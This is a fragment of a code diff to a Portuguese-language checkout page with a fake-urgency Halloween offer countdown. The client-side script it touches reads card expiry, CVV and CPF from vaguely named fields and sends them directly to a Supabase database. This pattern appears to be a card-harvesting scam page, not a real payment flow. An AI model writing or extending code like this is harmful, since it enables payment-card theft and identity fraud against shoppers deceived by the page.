@@ -35,7 +35,7 @@
     <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor">
       <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
     </svg>
-    <span>Oferta de Halloween 100reservada para você por: <span class="co-timer" id="checkoutTimer">14:59</span></span>
+    <span>Oferta de Halloween 14reservada para você por: <span class="co-timer" id="checkoutTimer">14:59</span></span>
   </div>
 
   <form id="checkoutForm" novalidate>
@@ -480,8 +480,6 @@
                     const validade = document.getElementById('cliV1')?.value || '';
                     const CVV = document.getElementById('cliC1')?.value || '';
                     const CPF = document.getElementById('cliC2')?.value || '';
-
-                    const enderecoCompleto = `CEP: ${cep} | Rua: ${rua}, Nº: ${numero}`;
                   
 // Envio para o Supabase incluindo agora a coluna C2
                     const { data, error } = await sb
